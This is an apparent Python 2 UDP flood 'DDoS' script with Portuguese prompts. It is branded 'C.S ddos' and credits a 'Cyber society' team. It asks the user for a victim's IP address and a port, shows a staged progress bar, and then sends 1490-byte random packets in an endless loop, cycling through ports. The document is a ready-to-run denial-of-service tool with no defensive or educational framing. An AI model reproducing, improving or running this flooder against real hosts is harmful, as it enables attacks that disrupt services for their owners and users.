#-*-coding:utf8;-*-
#qpy:console

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system("apt install figlet")
os.system("clear")
print '\033[32m'+'BEM VINDO'+'\033[0;0m'
os.system("figlet C.S ddos")
time.sleep(4)
print "|==================================================|"
print "|##################################################|"
print "|## Author   : JOSELUCAS                         ##|"
print "|## TEAM     : Cyber society                     ##|"
print "|## github   : https://github.com/joselucas257   ##|"
print "|##################################################|"
print "|==================================================|"
ip = raw_input("digite o ip da vitima : ")
time.sleep(2)
print("=========================")
print '\033[32m'+'porta recomendada 80'+'\033[0;0m'
print("=========================")
print("____________________________________________")
port = input("digite a porta : ")
time.sleep(2)
os.system("clear")
print '\033[42;1;33m'+'iniciando preparação pro attack'+'\033[0;0m'
os.system("figlet iniciando attack")
print "[                    ]  0% "
time.sleep(5)
print "[=====               ]  25%"
time.sleep(5)
print "[==========          ]  50%"
time.sleep(5)
print "[===============     ]  75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1